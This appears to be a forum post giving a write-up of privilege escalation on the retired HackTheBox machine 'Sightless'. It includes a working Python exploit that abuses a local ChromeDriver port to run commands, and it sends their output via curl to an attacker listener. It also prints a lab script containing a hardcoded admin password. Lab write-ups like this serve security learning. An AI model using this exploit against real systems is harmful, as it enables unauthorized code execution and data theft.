Hey folks,

I've been working on getting my OSCP and that means drilling HackTheBox. A few months ago, I found myself rabbit-holeing an easy box and it paid off. Now that the box is retired, I wanna share the trick I used. 

Sightless is a Box sporting SQLPad and Froxlor. Cracking SQLPad was easy enough and got me shell access as the user `michael`. 

According to the official writeup here, once you're on the box as `michael`, you're supposed to netstat for local ports and find 8080 for privesc. I was going about privesc recon saw that I needed to target the "john" account. `ps -aux | grep john` yielded quite a few interesting processes, and I didn't even need netstat to see that some dynamic ports were open (see `--port=34395` below)
![[Pasted image 20250401160249.png]]

Doing some digging, I found a [blogpost](https://www.gabriel.urdhr.fr/2021/08/16/chromedriver-cross-origin-request-forgery-rce/) from 2021 referencing a [quirk](https://issues.chromium.org/issues/40052697) (and I say quirk rather than vulnerability because the devs have marked this "won't fix") in chromium which you can use to get arbitrary code execution if and only if you're already on a box.

As such, I was able to write this goofy little codeblock after setting up a listener on 8001
```python
import requests
import json
import sys

def main(port, command):
    url = f"http://localhost:{port}/session"
    headers = {'Content-Type': 'text/plain'}
    
    # Body mimicking Chrome WebDriver configuration with dynamic command injection
    body = {
        "capabilities": {
            "alwaysMatch": {
                "goog:chromeOptions": {
                    "binary": "/usr/bin/python3",
                    "args": [f"-cimport os;os.system('curl 10.10.14.21:8001?cmd=$({command} | base64)')"]
                }
            }
        }
    }

    try:
        # Make the POST request
        response = requests.post(url, headers=headers, data=json.dumps(body))
        
        # Output the response status and content
        print(f"Response status code: {response.status_code}")
        print(f"Response content: {response.content}")
    
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    # Expect port and command to be passed as command-line arguments
    if len(sys.argv) != 3:
        print("Usage: python script.py <port> <command>")
    else:
        port = sys.argv[1]
        command = sys.argv[2]
        main(port, command)

```

while the shell this got me wasn't very privileged, it did yield me the Froxlor selenium script

```python
#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.common.exceptions import NoAlertPresentException
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support import expected_conditions as EC
import time
import threading
import schedule

options = Options()
options.add_argument('--headless')
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')

# Update this line with the path to your locally downloaded Chrome driver
chrome_driver_path = '/home/john/automation/chromedriver'

# Use Service to specify the Chrome driver binary path
service = Service(chrome_driver_path)
service.start()

driver = webdriver.Chrome(service=service, options=options)

def dismiss_all_alerts(driver):
    while True:
        try:
            alert = driver.switch_to.alert
            print(f"Dismissed alert with text: {alert.text}")
            alert.accept()
            time.sleep(1)
        except NoAlertPresentException:
            break

print("browser opened")
while True:
    try:
        driver.get("http://admin.sightless.htb:8080/admin_logger.php?page=log")
        time.sleep(7)

        # Username Field
        input_element = driver.find_element(By.ID, "loginname")
        input_element.send_keys("admin")

        # Password field
        input_element = driver.find_element(By.ID, "password")
        input_element.send_keys("ForlorfroxAdmin" + Keys.ENTER)
        print("Logged In...")
    except UnexpectedAlertPresentException:
        input_element.send_keys(Keys.ENTER)
        pass
    time.sleep(5)
    dismiss_all_alerts(driver)
    driver.get("http://admin.sightless.htb:8080/admin_index.php?action=logout")
    driver.get("http://admin.sightless.htb:8080/")
    print("Logged Out")
    time.sleep(3)
    #driver.close()
```

which, if you were paying attention, includes the line `input_element.send_keys("ForlorfroxAdmin" + Keys.ENTER)`. I was able to use this password to escalate.

If you're a CTF admin, make sure you're [hiding root processes from users](https://unix.stackexchange.com/questions/17164/how-to-make-a-process-invisible-to-other-users) and otherwise, happy hacking ;)